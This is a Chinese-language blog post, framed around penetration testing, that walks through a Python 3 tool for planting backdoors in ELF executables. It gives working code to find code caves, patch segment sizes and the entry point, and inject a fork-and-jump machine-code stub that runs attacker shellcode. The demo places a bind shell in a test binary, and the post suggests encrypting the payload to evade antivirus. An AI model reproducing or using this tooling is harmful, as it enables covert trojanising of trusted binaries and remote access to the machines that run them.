+++
title = "给 ELF 文件加上后门"
date = 2020-01-01
description = "在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 \"The backdoor factory\" 已经不维护了，而且还是 Python2 写的，代码质量也...所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况..."
[taxonomies]
tags = ["re", "mal", "backdoor"]
+++

在渗透测试中，给常用的可执行文件加上后门是很常见的操作。但是之前的加后门 "The backdoor factory" 已经不维护了，而且还是 Python2 写的，代码质量也...所以我自己尝试着重新用 Python3 造了个轮子。在造轮子的过程中，由于 APUE 扔在学校里面了，导致在写和系统相关的汇编时出现了一些翻车情况...

## 加后门的流程

基本分为两部分，先分析 ELF，然后根据之前的分析来给 ELF 加个"补丁"。

1. 先分析 ELF 结构，拿到 ELF File Header 和 ELF Program Headers (Segments) 的相关信息
2. 通过 ELF Program Header 找到带有执行权限的 LOAD 段，看看这个 LOAD 段后有没有 Code Cave。即寻找不属于其他的 Section，ELF 文件为了对其 Segments 而填充的大量 0 字节。如果 Segment 末尾出现了一堆 0 字节填充，并且大小合适的话，则选择在这段空白处作为后门的插入点
3. 扩充后门代码和辅助代码所在的 Segments 的 p_filesz 和 p_memsz，让后门代码得以加载进内存
4. 将 ELF File Header 的 e_entry 指向后门代码，让后门代码可以运行
5. 在空白处加入后门代码和相应的辅助代码

## ELF 分析过程

介绍 ELF 结构的文章非常多，这里我推荐 [UClib 的文档](https://uclibc.org/docs/elf-64-gen.pdf) ，里面讲了 ELF 的不同结构及其作用。有了这个文档后 ELF 文件的分析就非常简单了，可以使用 Python 的 `struct` 库来提取数据进行分析。首先通过 ELF File Header 获取到 `e_phoff` Program header 的文件偏移，然后 `seek` 到相应位置解析 Program header。

```python
class elf_info:
    '''
    This class will parse ELF file and get information from ELF file.
    '''

    def __init__(self, file):
        self.file = file
        self.header = self._parse_header()
        self.segments = self._parse_segment()

    def _parse_header(self):
        '''
        header parse part.
        '''
        hdr = {}
        hdr['e_ident'] = unpack('4sccccc6sc', self.file.read(16))
        hdr['e_type'], hdr['e_machine'] = unpack('<hh', self.file.read(4))
        hdr['e_version'], = unpack('<I', self.file.read(4))

        # Entry point virtual address
        hdr['e_entry'], = unpack('<Q', self.file.read(8))

        # segment/section header file offset
        hdr['e_phoff'], hdr['e_shoff'] = unpack('<QQ', self.file.read(16))

        # Processor-specific flags, ELF Header size in bytes
        hdr['e_flags'], hdr['e_ehsize'] = unpack('<Ih', self.file.read(6))

        # Program header table entry size, Program header table entry count
        hdr['e_phentsize'], hdr['e_phnum'] = unpack('<hh', self.file.read(4))

        # Section header table entry size, Section header table entry count
        hdr['e_shentsize'], hdr['e_shnum'] = unpack('<hh', self.file.read(4))

        # Section header string table index
        hdr['e_shtrndx'], = unpack('<h', self.file.read(2))

        return hdr

    def _parse_segment(self):
        '''
        segment/program header parse part.
        '''
        self.file.seek(self.header['e_phoff'])
        segments = []
        for i in range(self.header['e_phnum']):
            seg = {}
            # Type of segment, Segment attributes
            seg['p_type'], seg['p_flags'] = unpack('<II', self.file.read(8))

            # Offset in file
            seg['p_offset'], = unpack('<Q', self.file.read(8))

            # Virtual address in memory, Reserved
            seg['p_vaddr'], seg['p_paddr'] = unpack('<QQ', self.file.read(16))

            # Size of segment in file, Size of segment in memory
            seg['p_filesz'], seg['p_memsz'] = unpack('<QQ', self.file.read(16))

            # Alignment of segment
            seg['p_align'], = unpack('<Q', self.file.read(8))

            segments.append(seg)
        return segments
```

## ELF 补丁过程

下面是 Patch 程序的主要流程了，首先是找到合适大小的 Code Cave，然后修改 ELF File Header 和 ELF Program Header 为后门代码准备相应的内存，并让后门代码得以运行，最后往这个 Code Cave 里填上辅助代码和相应后门。

```python
class injector:
    def __init__(self, file, inject_code: bytes):
        self.file = file
        self.info = elf_info(self.file)

        raw = [b'\x6a\x39',                         # push  0x39
               b'\x58',                             # pop   rax
               b'\x0f\x05',                         # syscall
               b'\x48\x85\xc0',                     # test  rax, rax
               b'\x74\x12',                         # jz    16
               b'\xe8\x00\x00\x00\x00',             # call  $+5
               b'\x48\x8b\x2c\x24',                 # mov   rbp, [rsp]
               b'\x48\x81\xed\x00\x00\x00\x00',     # sub   rbp, offset
               b'\xff\xe5',                         # jmp   rbp
               inject_code]                         # inject code
        code = b''.join(raw)

        segs = self.find_cave(len(code))
        if len(segs) == 0:
            logger.error('No cave in the program')
            return

        target_idx = segs[0]['index']
        target = self.info.segments[target_idx]

        new_size = target['p_filesz'] + len(code)
        logger.info(f'Writing file/mem size to 0x{new_size:x}')
        self.extend_seg_size(target_idx, new_size)

        code_va = target['p_vaddr'] + target['p_filesz']
        logger.info(f'Writing entry to 0x{code_va:x}')
        self.modify_entry(code_va)

        code_foffset = target['p_offset'] + target['p_filesz']
        entry_offset = code_va + \
            len(b''.join(raw[:6])) - self.info.header['e_entry']
        raw[7] = raw[7][:3] + pack('<I', entry_offset)
        logger.info(f'entry_offset == {entry_offset}')
        logger.info(f'Writing code to 0x{code_foffset:x}')
        self.add_machine_code(code_foffset, b''.join(raw))
```

根据 ELF 信息，我们先寻找 ELF 文件中的 Cave。如果出现某个 LOAD Segment 的 'p_filesz' 和 'p_vaddr' 的和小于下一个 Segment 的 'p_vaddr'，那么很有可能在这个地方出现 Cave，通过遍历文件来验证这个 Segment 是否存在 Code Cave。

```python
def verify_cave(self, start: int, len_: int) -> int:
    '''
    Walking through file to verlify cave's size
    '''
    self.file.seek(start)
    count = 0
    while self.file.tell() < start + len_:
        b = self.file.read(1)
        if b == b'\x00':
            count += 1
        else:
            break
    return count

def find_cave(self, need_size: int):
    '''
    Find the cave in LOAD, exec segment
    cave means segment's file size is smaller than alloc size
    '''
    load_segs = list(filter(lambda x: x['p_type'] == 1,
                            self.info.segments))
    if len(load_segs) <= 0:
        exit(1)

    cave_segs = []
    for i in range(len(load_segs) - 1):
        c_seg = load_segs[i]
        n_seg = load_segs[i + 1]
        # Not a LOAD segments
        if not c_seg['p_flags'] & 1:
            continue

        # First verify
        max_range = c_seg['p_filesz'] + c_seg['p_vaddr']
        if max_range >= n_seg['p_vaddr']:
            continue

        real_size = self.verify_cave(c_seg['p_offset'] + c_seg['p_filesz'],
                                     n_seg['p_vaddr'] - max_range)
        # cave size is too small
        if real_size <= need_size:
            continue

        logger.info(f'Found a {real_size} bytes cave')
        cave_segs.append({'index': self.info.segments.index(c_seg),
                            'cave_size': real_size})
    return cave_segs
```

接下来就算 Patch 上 entry 和 Program Header，让辅助代码和后门得以载入内存并运行。Segment 的新 filesz 由 `Segment 的旧 filesz + 注入代码长度` 得到。而程序的新入口点则是由 `Segment 的虚拟地址 + Segment 的旧filesz` 得到。

```python
new_size = target['p_filesz'] + len(code)
logger.info(f'Writing file/mem size to 0x{new_size:x}')
self.extend_seg_size(target_idx, new_size)

code_va = target['p_vaddr'] + target['p_filesz']
logger.info(f'Writing entry to 0x{code_va:x}')
self.modify_entry(code_va)

def extend_seg_size(self, seg_pos: int, new_size: int):
    '''
    Patch segment to increase LOAD file size
    '''
    file_pos = self.info.header['e_phoff'] + \
        seg_pos * self.info.header['e_phentsize']
    if self.info.header['e_machine'] == 62:
        file_pos += 32
    # TODO: abstract elf types to adapt more architectures
    else:
        pass
    self.file.seek(file_pos)
    # TODO: static pack size
    self.file.write(pack('<Q', new_size) * 2)

def modify_entry(self, new_entry: int):
    self.file.seek(24)
    self.file.write(pack('<Q', new_entry))
```

然后是往 Code Cave 处加入辅助代码和后门。后门代码的位置由 `目标 Segment 的文件偏移 + 目标 Segment 的文件大小` 计算得到，辅助代码改动自 The backdoor factory。这里需要注意的是辅助代码的逻辑，首先是用 `fork` 创建子进程，如果当前程序是子进程的话，则执行后门，如果当前程序不是子进程的话，就通过计算当前指令地址和原 entry 的距离，以跳转到原程序的 entry。

```python
raw = [b'\x6a\x39',                         # push  0x39
       b'\x58',                             # pop   rax
       b'\x0f\x05',                         # syscall
       b'\x48\x85\xc0',                     # test  rax, rax
       b'\x74\x12',                         # jz    16
       b'\xe8\x00\x00\x00\x00',             # call  $+5
       b'\x48\x8b\x2c\x24',                 # mov   rbp, [rsp]
       b'\x48\x81\xed\x00\x00\x00\x00',     # sub   rbp, offset
       b'\xff\xe5',                         # jmp   rbp
       inject_code]                         # inject code
code = b''.join(raw)
code_foffset = target['p_offset'] + target['p_filesz']
entry_offset = code_va + \
    len(b''.join(raw[:6])) - self.info.header['e_entry']
raw[7] = raw[7][:3] + pack('<I', entry_offset)
logger.info(f'entry_offset == {entry_offset}')
logger.info(f'Writing code to 0x{code_foffset:x}')
self.add_machine_code(code_foffset, b''.join(raw))

def add_machine_code(self, pos: int, code: bytes):
    '''
    Add code in the increased LOAD segments
    '''
    self.file.seek(pos)
    self.file.write(code)
```

## 实战

首先先准备个傀儡，使用 `gcc test.c -o test.elf` 进行编译，由于辅助汇编代码对 The backdoor factory 进行了修改，所以位置无关代码也是可以 Patch 的。

```c
#include <stdio.h>

int main()
{
    printf("Hello, world!\n");
    return 0;
}
```

我使用了 <https://www.exploit-db.com/shellcodes/41128> 的正向 Shell 代码，可以发现原程序正常运行，而后门代码也运行了。

![0](/images/elf_backdoor.png)

## 完整代码

由于代码太长了，所以我将代码放在了 [Github](https://github.com/chenx6/gadget/tree/master/elf_backdoor) 上了。

## 未完成工作

这个代码只是一个简单的 DEMO，想要扩展成可维护的软件的话，我个人有下面几个发展方向

1. 将 pack 和 unpack 进行封装，类似 pwntools。
2. 对 32 位 ELF 文件及其他架构 CPU 的支持可以由增加 ELF 信息来实现，例如在 ELF 信息中将字节序，每一种类型的长度，提取方法通过 ELF 信息类的成员来进行描述。
3. 本文只实现了当 Code Cave 存在时的后门植入，如果没有 Code Cave 时候需要扩展文件来实现后门植入。
4. 对辅助代码及后门代码进行改写，加密以实现绕过杀毒软件。
5. 使用还在维护的库对 ELF 进行 Patch，例如 LIEF。

## refs

exploit database <https://www.exploit-db.com>

The backdoor factory<https://github.com/secretsquirrel/the-backdoor-factory/>

UCLib 关于 ELF 格式的文档<https://uclibc.org/docs/elf-64-gen.pdf>

看不进去英文可以配合 CSDN 这篇文章 <https://blog.csdn.net/feglass/article/details/51469511>
